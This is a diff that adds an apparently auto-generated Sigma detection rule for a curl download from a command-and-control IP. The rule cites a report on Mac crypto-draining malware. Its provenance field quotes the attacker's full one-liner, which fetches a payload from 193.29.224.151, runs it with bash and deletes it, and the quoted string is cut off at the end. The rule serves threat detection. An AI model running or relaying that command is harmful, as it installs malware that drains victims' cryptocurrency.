@@ -1,0 +1,40 @@
+title: 'Command the source shows being run: curl http://193.29.224.151/92392991a0cca55?force=1'
+id: cea76086-6164-4f0c-9103-b5e621ba016f
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "curl -kfsSL "http://193.29.224.151/92392991a0cca55?force=1"
+  -o .UlaccK".'
+references:
+- https://www.huntress.com/blog/mac-crypto-draining-malware
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-07'
+tags:
+- attack.t1105
+logsource:
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: /curl
+    CommandLine|contains: http://193.29.224.151/92392991a0cca55?force=1
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hecate_provenance:
+- value: 193.29.224.151
+  type: ipv4
+  role: c2
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: The command instructed the computer to retrieve a file from the 193.29.224[.]151 IP address,
+    execute it, then delete the temporarily stored file.
+- value: http://193.29.224.151/92392991a0cca55?force=1
+  type: url
+  role: download
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: export SRC_URL='https://profitnow[.]io/' && (cd /tmp && curl -kfsSL "http://193.29.224[.]151/92392991a0cca55?force=1"
+    -o .UlaccK && bash .UlaccK && rm -f .UlaccK) > /dev/null 2>&1 & clear; printf '\03
+hunt_id: H-0642
